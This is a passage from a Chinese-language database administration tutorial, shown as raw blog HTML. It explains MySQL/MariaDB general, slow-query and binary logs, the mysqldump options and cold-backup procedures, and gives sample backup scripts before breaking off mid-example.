id="范例：通用日志记录到表中"><a href="#范例：通用日志记录到表中" class="headerlink" title="范例：通用日志记录到表中"></a>范例：通用日志记录到表中</h4><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-comment">#修改通用日志，记录通用日志至mysql.general_log表中</span><br>MariaDB [mysql]&gt; <span class="hljs-built_in">set</span> global log_output=<span class="hljs-string">&quot;table&quot;</span>;<br>MariaDB [mysql]&gt; SHOW GLOBAL VARIABLES LIKE <span class="hljs-string">&#x27;log_output&#x27;</span>; <br>+---------------+-------+<br>| Variable_name | Value |<br>+---------------+-------+<br>| log_output    | TABLE |<br>+---------------+-------+<br>1 row <span class="hljs-keyword">in</span> <span class="hljs-built_in">set</span> (0.002 sec)<br><br><span class="hljs-comment">#general_log表是CSV的文本文件</span><br>[root@centos8 ~]<span class="hljs-comment">#file /var/lib/mysql/mysql/general_log.CSV</span><br>/var/lib/mysql/mysql/general_log.CSV: ASCII text<br>[root@centos8 ~]<span class="hljs-comment">#head /var/lib/mysql/mysql/general_log.CSV</span><br><span class="hljs-string">&quot;2021-02-05 10:02:03.629031&quot;</span>,<span class="hljs-string">&quot;root[root] @ localhost []&quot;</span>,8,1,<span class="hljs-string">&quot;Query&quot;</span>,<span class="hljs-string">&quot;show databases&quot;</span><br><span class="hljs-string">&quot;2021-02-05 10:02:03.629901&quot;</span>,<span class="hljs-string">&quot;root[root] @ localhost []&quot;</span>,8,1,<span class="hljs-string">&quot;Query&quot;</span>,<span class="hljs-string">&quot;show tables&quot;</span><br>MariaDB [mysql]&gt; select * from mysql.general_log\G<br>...省略...<br>*************************** 7. row ***************************<br> event_time: 2019-11-25 11:03:44.549211<br>   user_host: root[root] @ localhost []<br>   thread_id: 8<br>   server_id: 1<br>command_type: Query<br>   argument: select * from general_log<br>7 rows <span class="hljs-keyword">in</span> <span class="hljs-built_in">set</span> (0.000 sec)<br></code></pre></td></tr></table></figure><h3 id="6-4-慢查询日志"><a href="#6-4-慢查询日志" class="headerlink" title="6.4 慢查询日志"></a>6.4 慢查询日志</h3><blockquote><p>记录执行查询时长超出指定时长的操作</p></blockquote><h4 id="慢查询相关变量"><a href="#慢查询相关变量" class="headerlink" title="慢查询相关变量"></a>慢查询相关变量</h4><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><code class="hljs bash">slow_query_log=ON|OFF <span class="hljs-comment">#开启或关闭慢查询，支持全局和会话，只有全局设置才会生成慢查询文件</span><br>long_query_time=N <span class="hljs-comment">#慢查询的阀值，单位秒,默认为10s</span><br>slow_query_log_file=HOSTNAME-slow.log  <span class="hljs-comment">#慢查询日志文件</span><br>log_slow_filter = admin,filesort,filesort_on_disk,full_join,full_scan,<br>query_cache,query_cache_miss,tmp_table,tmp_table_on_disk <br><span class="hljs-comment">#上述查询类型且查询时长超过long_query_time，则记录日志</span><br>log_queries_not_using_indexes=ON  <span class="hljs-comment">#不使用索引或使用全索引扫描，不论是否达到慢查询阀值的语句是否记录日志，默认OFF，即不记录</span><br>log_slow_rate_limit = 1 <span class="hljs-comment">#多少次查询才记录，mariadb特有</span><br>log_slow_verbosity= Query_plan,explain <span class="hljs-comment">#记录内容</span><br>log_slow_queries = OFF    <span class="hljs-comment">#同slow_query_log，MariaDB 10.0/MySQL 5.6.1 版后已删除</span><br><br>select @@slow_query_log;<br></code></pre></td></tr></table></figure><h3 id="6-5-二进制日志-备份"><a href="#6-5-二进制日志-备份" class="headerlink" title="6.5 二进制日志(备份)"></a>6.5 二进制日志(备份)</h3><blockquote><ul><li>记录导致数据改变或潜在导致数据改变的SQL语句</li><li>记录已提交的日志</li><li>不依赖于存储引擎类型</li></ul><p>功能：通过”重放”日志文件中的事件来生成数据副本</p><p>注意：建议二进制日志和数据文件分开存放</p><p><strong>二进制日志记录三种格式</strong></p><ul><li>基于”<strong>语句</strong>“记录：statement，记录语句，默认模式（ MariaDB 10.2.3 版本以下 ），日志量较少</li><li>基于”<strong>行</strong>“记录：row，记录数据，日志量较大，更加安全，建议使用的格式,MySQL8.0默认格式</li><li>混合模式：mixed, 让系统自行判定该基于哪种方式进行，默认模式（ MariaDB 10.2.4及版本以上）</li></ul><p><strong>格式配置：</strong></p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><code class="hljs bash">MariaDB [hellodb]&gt; show variables like <span class="hljs-string">&#x27;binlog_format&#x27;</span>;<br>+---------------+-------+<br>| Variable_name | Value |<br>+---------------+-------+<br>| binlog_format | MIXED |<br>+---------------+-------+<br>1 row <span class="hljs-keyword">in</span> <span class="hljs-built_in">set</span> (0.001 sec)<br><span class="hljs-comment">#MySQL 8.0 默认使用ROW方式</span><br>mysql&gt; show variables like <span class="hljs-string">&#x27;binlog_format&#x27;</span>;<br>+---------------+-------+<br>| Variable_name | Value |<br>+---------------+-------+<br>| binlog_format | ROW   |<br>+---------------+-------+<br>1 row <span class="hljs-keyword">in</span> <span class="hljs-built_in">set</span> (0.07 sec)<br></code></pre></td></tr></table></figure></blockquote><h4 id="二进制日志文件的构成"><a href="#二进制日志文件的构成" class="headerlink" title="二进制日志文件的构成"></a>二进制日志文件的构成</h4><blockquote><p> 有两类文件</p><p>1.日志文件：mysql|mariadb-bin.文件名后缀，二进制格式,如： on.000001,mariadb-bin.000002</p><p>2.索引文件：mysql|mariadb-bin.index，文本格式,记录当前已有的二进制日志文件列表</p></blockquote><h4 id="二进制日志相关的服务器变量"><a href="#二进制日志相关的服务器变量" class="headerlink" title="二进制日志相关的服务器变量"></a>二进制日志相关的服务器变量</h4><blockquote><ul><li><strong>sql_log_bin=ON|OFF：#是否记录二进制日志，默认ON，支持动态修改，系统变量，而非服务器选项</strong></li><li><strong>log_bin=/PATH/BIN_LOG_FILE：#指定文件位置；默认OFF，表示不启用二进制日志功能，上述两项都开启才可以</strong></li><li>binlog_format=STATEMENT|ROW|MIXED：#二进制日志记录的格式，mariadb5.5默认STATEMENT</li><li>max_binlog_size=1073741824：#单个二进制日志文件的最大体积，到达最大值会自动滚动，默认为1G</li><li>#说明：文件达到上限时的大小未必为指定的精确值</li><li>binlog_cache_size=4m #此变量确定在每次事务中保存二进制日志更改记录的缓存的大小（每次连接）</li><li>max_binlog_cache_size=512m #限制用于缓存多事务查询的字节大小。</li><li>sync_binlog=1|0：#设定是否启动二进制日志即时同步磁盘功能，默认0，由操作系统负责同步日志到磁盘</li><li>expire_logs_days=N：#二进制日志可以自动删除的天数。 默认为0，即不自动删除</li></ul></blockquote><h4 id="查看mariadb自行管理使用中的二进制日志文件列表，及大小"><a href="#查看mariadb自行管理使用中的二进制日志文件列表，及大小" class="headerlink" title="查看mariadb自行管理使用中的二进制日志文件列表，及大小"></a>查看mariadb自行管理使用中的二进制日志文件列表，及大小</h4><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">SHOW &#123;BINARY | MASTER&#125; LOGS    <br></code></pre></td></tr></table></figure><h4 id="查看使用中的二进制日志文件"><a href="#查看使用中的二进制日志文件" class="headerlink" title="查看使用中的二进制日志文件"></a><strong>查看使用中的二进制日志文件</strong></h4><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">SHOW MASTER STATUS<br></code></pre></td></tr></table></figure><h4 id="在线查看二进制文件中的指定内容"><a href="#在线查看二进制文件中的指定内容" class="headerlink" title="在线查看二进制文件中的指定内容"></a>在线查看二进制文件中的指定内容</h4><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs bash">SHOW BINLOG EVENTS [IN <span class="hljs-string">&#x27;log_name&#x27;</span>] [FROM pos] [LIMIT [offset,] row_count]<br><br><span class="hljs-comment">#范例：</span><br>show binlog events <span class="hljs-keyword">in</span> <span class="hljs-string">&#x27;mysql-bin.000001&#x27;</span> from 6516 <span class="hljs-built_in">limit</span> 2,3<br></code></pre></td></tr></table></figure><h4 id="mysqlbinlog"><a href="#mysqlbinlog" class="headerlink" title="mysqlbinlog"></a>mysqlbinlog</h4><blockquote><p>二进制日志的客户端命令工具，支持离线查看二进制日志</p><p>命令格式：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs bash">mysqlbinlog [OPTIONS] log_file…<br> --start-position=<span class="hljs-comment"># 指定开始位置</span><br> --stop-position=<span class="hljs-comment">#</span><br> --start-datetime=  <span class="hljs-comment">#时间格式：YYYY-MM-DD hh:mm:ss</span><br> --stop-datetime= <br> --base64-output[=name]<br>        -v -vvv<br></code></pre></td></tr></table></figure></blockquote><h5 id="使用范例-4"><a href="#使用范例-4" class="headerlink" title="使用范例"></a>使用范例</h5><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs bash">mysqlbinlog --start-position=678 --stop-position=752 /var/lib/mysql/mariadbbin.000003 -v<br>mysqlbinlog  --start-datetime=<span class="hljs-string">&quot;2018-01-30 20:30:10&quot;</span>   --stop-datetime=<span class="hljs-string">&quot;2018-01-30 20:35:22&quot;</span> mariadb-bin.000003 -vvv<br></code></pre></td></tr></table></figure><h5 id="范例：-同步远程主机的二进制日志"><a href="#范例：-同步远程主机的二进制日志" class="headerlink" title="范例： 同步远程主机的二进制日志"></a>范例： 同步远程主机的二进制日志</h5><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-comment">#从10.0.0.8远程主机实时同步二进制日志binlog.000002开始向后进行同步到当前目录</span><br>[root@centos8 data]<span class="hljs-comment">#mysqlbinlog -R --host=10.0.0.8 --user=test --password=123456 --raw --stop-never binlog.000002</span><br></code></pre></td></tr></table></figure><h4 id="清除指定二进制日志"><a href="#清除指定二进制日志" class="headerlink" title="清除指定二进制日志"></a>清除指定二进制日志</h4><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs bash">PURGE &#123; BINARY | MASTER &#125; LOGS &#123; TO <span class="hljs-string">&#x27;log_name&#x27;</span> | BEFORE datetime_expr &#125;<br><br><span class="hljs-comment">#范例</span><br>PURGE BINARY LOGS TO <span class="hljs-string">&#x27;mariadb-bin.000003&#x27;</span>; <span class="hljs-comment">#删除mariadb-bin.000003之前的日志</span><br>PURGE BINARY LOGS BEFORE <span class="hljs-string">&#x27;2017-01-23&#x27;</span>;<br>PURGE BINARY LOGS BEFORE <span class="hljs-string">&#x27;2017-03-22 09:25:30&#x27;</span>;<br></code></pre></td></tr></table></figure><h4 id="删除所有二进制日志，index文件重新记数"><a href="#删除所有二进制日志，index文件重新记数" class="headerlink" title="删除所有二进制日志，index文件重新记数"></a>删除所有二进制日志，index文件重新记数</h4><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs bash">RESET MASTER [TO <span class="hljs-comment">#]; </span><br><span class="hljs-comment">#删除所有二进制日志文件，并重新生成日志文件，文件名从#开始记数，</span><br><span class="hljs-comment">#默认从1开始，一般是master主机第一次启动时执行，MariaDB 10.1.6开始支持TO #</span><br></code></pre></td></tr></table></figure><h4 id="切换日志文件"><a href="#切换日志文件" class="headerlink" title="切换日志文件"></a>切换日志文件</h4><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">FLUSH LOGS;<br></code></pre></td></tr></table></figure><h1 id="-3"><a href="#-3" class="headerlink" title=""></a></h1><hr><h1 id="五、MySQL-备份和恢复"><a href="#五、MySQL-备份和恢复" class="headerlink" title="五、MySQL 备份和恢复"></a>五、MySQL 备份和恢复</h1><h2 id="1-备份恢复概述"><a href="#1-备份恢复概述" class="headerlink" title="1 备份恢复概述"></a>1 备份恢复概述</h2><p><a href="https://img2022.cnblogs.com/blog/2927659/202210/2927659-20221030195227996-1454244001.png"><img src="2927659-20221030195227996-1454244001.png" alt="img"></a></p><h3 id="1-1-备份类型"><a href="#1-1-备份类型" class="headerlink" title="1.1 备份类型"></a>1.1 备份类型</h3><blockquote><ul><li>完全备份，部分备份</li></ul><p>     完全备份：整个数据集</p><p>     部分备份：只备份数据子集，如部分库或表</p><ul><li>完全备份、增量备份、差异备份</li></ul><p>     增量备份：仅备份最近一次完全备份或增量备份（如果存在增量）以来变化的数据，备份较快，还原复杂</p><p>     差异备份：仅备份最近一次完全备份以来变化的数据，备份较慢，还原简单</p><p>注意：二进制日志文件不应该与数据文件放在同一磁盘</p><ul><li>冷、温、热备份</li></ul><p>     冷备：读、写操作均不可进行，数据库停止服务</p><p>     温备：读操作可执行；但写操作不可执行</p><p>     热备：读、写操作均可执行</p><p>      MyISAM：温备，不支持热备</p><p>      InnoDB：都支持</p><ul><li>物理和逻辑备份</li></ul><p>     物理备份：直接复制数据文件进行备份，与存储引擎有关，占用较多的空间，速度快</p><p>     逻辑备份：从数据库中”导出”数据另存而进行的备份，与存储引擎无关，占用空间少，速度慢，可能丢失精度</p></blockquote><h3 id="1-2-实战案例：数据库冷备份和还原"><a href="#1-2-实战案例：数据库冷备份和还原" class="headerlink" title="1.2 实战案例：数据库冷备份和还原"></a>1.2 实战案例：数据库冷备份和还原</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-comment">#MySQL8.0</span><br><span class="hljs-comment">#备份过程</span><br>[root@centos8 ~]<span class="hljs-comment">#systemctl stop mysqld</span><br><span class="hljs-comment">#备份数据</span><br>[root@centos8 ~]<span class="hljs-comment">#rsync -a /var/lib/mysql 10.0.0.28:/data/</span><br><span class="hljs-comment">#如果配置及二进制文件相关有特殊设置也需要备份</span><br><span class="hljs-comment">#还原</span><br>[root@centos8 ~]<span class="hljs-comment">#yum -y install mysql-server</span><br>[root@centos8 ~]<span class="hljs-comment">#cp -a /data/mysql/* /var/lib/mysql/</span><br>[root@centos8 ~]<span class="hljs-comment">#systemctl start mysqld</span><br><br><span class="hljs-comment">#Mariadb10.3</span><br><span class="hljs-comment">#在目标服务器（10.0.0.18）安装mariadb-server，不启动服务</span><br>[root@centos8 ~]<span class="hljs-comment">#dnf install mariadb-server</span><br><span class="hljs-comment">#在源主机（10.0.0.8）执行</span><br>[root@centos8 ~]<span class="hljs-comment"># systemctl stop mariadb</span><br><span class="hljs-comment">#复制相关文件</span><br>[root@centos8 ~]<span class="hljs-comment"># scp -r /var/lib/mysql/* 10.0.0.18:/var/lib/mysql/</span><br>[root@centos8 ~]<span class="hljs-comment"># scp /etc/my.cnf.d/mariadb-server.cnf 10.0.0.18:/etc/my.cnf.d/</span><br>[root@centos8 ~]<span class="hljs-comment"># scp -r /data/logbin/ 10.0.0.18:/data/   #10.0.0.18须事先存在/data/目录</span><br><span class="hljs-comment">#复制相关文件并保留属性：可以用rsync</span><br>[root@centos8 ~]<span class="hljs-comment">#rsync /etc/my.cnf.d/mariadb-server.cnf 10.0.0.18:/etc/my.cnf.d/</span><br>[root@centos8 ~]<span class="hljs-comment">#rsync -av /var/lib/mysql/ 10.0.0.18:/var/lib/mysql/ </span><br>[root@centos8 ~]<span class="hljs-comment">#rsync -av/data/logbin/ 10.0.0.18:/data/   #10.0.0.18 须事先存在/data/目录</span><br><span class="hljs-comment">#在目标主机（10.0.0.18）执行</span><br>[root@centos8 ~]<span class="hljs-comment">#chown -R mysql.mysql /var/lib/mysql/</span><br>[root@centos8 ~]<span class="hljs-comment">#chown -R mysql.mysql /data/logbin/</span><br>[root@centos8 ~]<span class="hljs-comment">#systemctl start mariadb</span><br></code></pre></td></tr></table></figure><h2 id="2-mysqldump-备份工具"><a href="#2-mysqldump-备份工具" class="headerlink" title="2 mysqldump 备份工具"></a>2 mysqldump 备份工具</h2><h3 id="2-1-mysqldump-说明"><a href="#2-1-mysqldump-说明" class="headerlink" title="2.1 mysqldump 说明"></a>2.1 mysqldump 说明</h3><blockquote><p><strong>命令格式</strong><strong>:</strong></p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs bash">mysqldump [OPTIONS] database [tables]   <span class="hljs-comment">#支持指定数据库和指定多表的备份，但数据库本身定义不备份</span><br>mysqldump [OPTIONS] -B DB1 [DB2 DB3...] <span class="hljs-comment">#支持指定数据库备份，包含数据库本身定义也会备份</span><br>mysqldump [OPTIONS] -A [OPTIONS]        <span class="hljs-comment">#备份所有数据库，包含数据库本身定义也会备份</span><br></code></pre></td></tr></table></figure><p><strong>mysqldump</strong> <strong>常见通用选项：</strong></p><ul><li><p><strong>-u, –user=name   User for login if not current user</strong></p></li><li><p><strong>-p, –password[=name]  Password to use when connecting to server</strong></p></li><li><p><strong>-A, –all-databases #备份所有数据库，含create database</strong></p></li><li><p><strong>-B, –databases db_name…  #指定备份的数据库，包括create database语句</strong></p></li><li><p>-E, –events：#备份相关的所有event scheduler</p></li><li><p>-R, –routines：#备份所有存储过程和自定义函数</p></li><li><p>–triggers：#备份表相关触发器，默认启用,用–skip-triggers，不备份触发器</p></li><li><p>–default-character-set=utf8 #指定字符集</p></li><li><p><strong>–master-data[=#]：#注意：MySQL8.0.26版以后，此选项变为–source-data</strong></p></li><li><p>#此选项须启用二进制日志</p></li><li><p><strong>#1</strong>：所备份的数据之前<strong>加一条记录为CHANGE MASTER TO</strong>语句，非注释，不指定#，<strong>默认为1</strong>，<strong>适合于主从复制多机使用</strong></p></li><li><p><strong>#2：记录为被注释的#CHANGE MASTER TO语句，适合于单机使用,适用于备份还原</strong></p></li><li><p>#此选项会自动关闭–lock-tables功能，自动打开-x | –lock-all-tables功能（除非开启–single-transaction）</p></li><li><p><strong>-F, –flush-logs #备份前滚动日志，锁定表完成后，执行flush logs命令,生成新的二进制日志文件，配合-A 或 -B 选项时，会导致刷新多次数据库。建议在同一时刻执行转储和日志刷新，可通过和–single-transaction</strong>或-x<strong>，–master-data 一起使用实现，此时只刷新一次二进制日志</strong></p></li><li><p>–compact     #去掉注释，适合调试，节约备份占用的空间,生产不使用</p></li><li><p>-d, –no-data   #只备份表结构,不备份数据,即只备份create table</p></li><li><p>-t, –no-create-info #只备份数据,不备份表结构,即不备份create table</p></li><li><p>-n,–no-create-db #不备份create database，可被-A或-B覆盖</p></li><li><p>–flush-privileges #备份mysql或相关时需要使用</p></li><li><p>-f, –force    #忽略SQL错误，继续执行</p></li><li><p>–hex-blob     #使用十六进制符号转储二进制列，当有包括BINARY,VARBINARY,BLOB，BIT的数据类型的列时使用，避免乱码</p></li><li><p>-q, –quick   #不缓存查询，直接输出，加快备份速度</p></li></ul></blockquote><blockquote><p><strong>mysqldump<strong><strong>的</strong></strong>MyISAM****存储引擎相关的备份选项：</strong></p><p>MyISAM不支持事务，只能支持温备；不支持热备，所以必须先锁定要备份的库，而后启动备份操作</p><ul><li>-x,–lock-all-tables #加全局读锁，锁定所有库的所有表，同时加–single-transaction或–lock-tables选项会关闭此选项功能，注意：数据量大时，可能会导致长时间无法并发访问数据库</li><li>-l,–lock-tables #对于需要备份的每个数据库，在启动备份之前分别锁定其所有表，默认为on,–skip-lock-tables选项可禁用,对备份MyISAM的多个库,可能会造成数据不一致<br>#注：以上选项对InnoDB表一样生效，实现温备，但不推荐使用</li></ul><p><strong>mysqldump<strong><strong>的</strong></strong>InnoDB****存储引擎相关的备份选项：</strong></p><p>InnoDB 存储引擎支持事务,可以利用事务的相应的隔离级别,实现热备，也可以实现温备但不建议用</p><ul><li><strong>–single-transaction</strong></li></ul><p>#此选项Innodb中推荐使用，且<strong>不会锁表</strong>！不适用MyISAM，此选项会开始备份前，先执行START TRANSACTION指令开启事务</p><p>#此选项通过在单个事务中转储所有表来创建一致的快照。 仅适用于存储在支持多版本控制的存储引擎中的表（目前只有InnoDB可以）; 转储不保证与其他存储引擎保持一致。 在进行单事务转储时，要确保有效的转储文件（正确的表内容和二进制日志位置），没有其他连接应该使用以下语句：ALTER TABLE，DROP TABLE，RENAME TABLE，TRUNCATE TABLE,此选项和–lock-tables（此选项隐含提交挂起的事务）选项是相互排斥,备份大型表时，建议将–single-transaction选项和–quick结合一起使用</p></blockquote><h3 id="2-2-生产环境实战备份策略"><a href="#2-2-生产环境实战备份策略" class="headerlink" title="2.2 生产环境实战备份策略"></a>2.2 生产环境实战备份策略</h3><h4 id="InnoDB建议备份策略"><a href="#InnoDB建议备份策略" class="headerlink" title="InnoDB建议备份策略"></a>InnoDB建议备份策略</h4><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs bash">mysqldump -uroot -p -A -F -E -R --triggers --single-transaction --master-data=1 \<br>--flush-privileges --default-character-set=utf8 --hex-blob &gt;<span class="hljs-variable">$&#123;BACKUP&#125;</span>/fullbak_<span class="hljs-variable">$&#123;BACKUP_TIME&#125;</span>.sql<br></code></pre></td></tr></table></figure><h4 id="MyISAM建议备份策略"><a href="#MyISAM建议备份策略" class="headerlink" title="MyISAM建议备份策略"></a>MyISAM建议备份策略</h4><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs bash">mysqldump -uroot -p -A -F -E -R -x --master-data=1 --flush-privileges  \<br>--triggers  --default-character-set=utf8  --hex-blob&gt;<span class="hljs-variable">$&#123;BACKUP&#125;</span>/fullbak_<span class="hljs-variable">$&#123;BACKUP_TIME&#125;</span>.sql<br></code></pre></td></tr></table></figure><h3 id="2-3-mysqldump-备份还原实战案例"><a href="#2-3-mysqldump-备份还原实战案例" class="headerlink" title="2.3 mysqldump 备份还原实战案例"></a>2.3 mysqldump 备份还原实战案例</h3><h4 id="实战案例：特定数据库的备份脚本"><a href="#实战案例：特定数据库的备份脚本" class="headerlink" title="实战案例：特定数据库的备份脚本"></a>实战案例：特定数据库的备份脚本</h4><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs bash">[root@centos8 ~]<span class="hljs-comment">#cat mysql_backup.sh </span><br><span class="hljs-comment">#!/bin/bash</span><br>TIME=`<span class="hljs-built_in">date</span> +%F_%H-%M-%S`<br>DIR=/backup<br>DB=hellodb<br>PASS=123456<br>[ -d <span class="hljs-variable">$DIR</span> ] || <span class="hljs-built_in">mkdir</span> <span class="hljs-variable">$DIR</span><br>mysqldump -uroot -p <span class="hljs-string">&quot;<span class="hljs-variable">$PASS</span>&quot;</span> -F --triggers --single-transaction --master-data=2 -B <span class="hljs-variable">$DB</span> | gzip &gt; <span class="hljs-variable">$&#123;DIR&#125;</span>/<span class="hljs-variable">$&#123;DB&#125;</span>_<span class="hljs-variable">$&#123;TIME&#125;</span>.sql.gz<br><br><span class="hljs-comment">#只用上面的参数足够了</span><br>mysqldump -uroot -p <span class="hljs-string">&quot;<span class="hljs-variable">$PASS</span>&quot;</span> -F -E -R --triggers --single-transaction --master-data=2 --default-character-set=utf8 -q -B <span class="hljs-variable">$DB</span> | gzip &gt; <span class="hljs-variable">$&#123;DIR&#125;</span>/<span class="hljs-variable">$&#123;DB&#125;</span>_<span class="hljs-variable">$&#123;TIME&#125;</span>.sql.gz<br></code></pre></td></tr></table></figure><h4 id="实战案例：分库备份的实战脚本"><a href="#实战案例：分库备份的实战脚本" class="headerlink" title="实战案例：分库备份的实战脚本"></a>实战案例：分库备份的实战脚本</h4><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><code class="hljs bash">[root@centos8 ~]<span class="hljs-comment">#cat backup_db.sh </span><br><span class="hljs-comment">#!/bin/bash</span><br>TIME=`<span class="hljs-built_in">date</span> +%F_%H-%M-%S`<br>DIR=/backup<br>PASS=123456<br>[ -d <span class="hljs-string">&quot;<span class="hljs-variable">$DIR</span>&quot;</span> ] || <span class="hljs-built_in">mkdir</span> <span class="hljs-variable">$DIR</span><br><span class="hljs-keyword">for</span> DB <span class="hljs-keyword">in</span> `mysql -uroot -p <span class="hljs-string">&quot;<span class="hljs-variable">$PASS</span>&quot;</span> -e <span class="hljs-string">&#x27;show databases&#x27;</span> | grep -Ev <span class="hljs-string">&quot;^Database|.*schema$&quot;</span>`;<span class="hljs-keyword">do</span><br>    mysqldump -F --single-transaction --master-data=2 -B <span class="hljs-variable">$DB</span> | gzip &gt; <span class="hljs-variable">$&#123;DIR&#125;</span>/<span class="hljs-variable">$&#123;DB&#125;</span>_<span class="hljs-variable">$&#123;TIME&#125;</span>.sql.gz<br><span class="hljs-keyword">done</span><br><br><span class="hljs-comment">#只用上面的参数足够了</span><br>mysqldump -F --single-transaction --master-data=2 --default-character-set=utf8 -q -B <span class="hljs-variable">$DB</span> | gzip &gt;  <span class="hljs-variable">$&#123;DIR&#125;</span>/<span class="hljs-variable">$&#123;DB&#125;</span>_<span class="hljs-variable">$&#123;TIME&#125;</span>.sql.gz<br></code></pre></td></tr></table></figure><h4 id="实战案例：恢复误删除的表"><a href="#实战案例：恢复误删除的表" class="headerlink" title="实战案例：恢复误删除的表"></a>实战案例：恢复误删除的表</h4><blockquote><p>案例说明：每天2：30做完全备份，早上10：00误删除了表students，10：10才发现故障，现需要将数据库还原到10：10的状态，且恢复被删除的students表</p></blockquote><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-comment">#完全备份,要求必须开启二进制日志(@@sql_log_bin和@@log_bin)</span><br>[root@rocky01 ~]<span class="hljs-comment"># mkdir /backup</span><br>[root@rocky01 ~]<span class="hljs-comment"># mysqldump -uroot -p123456 -A -F 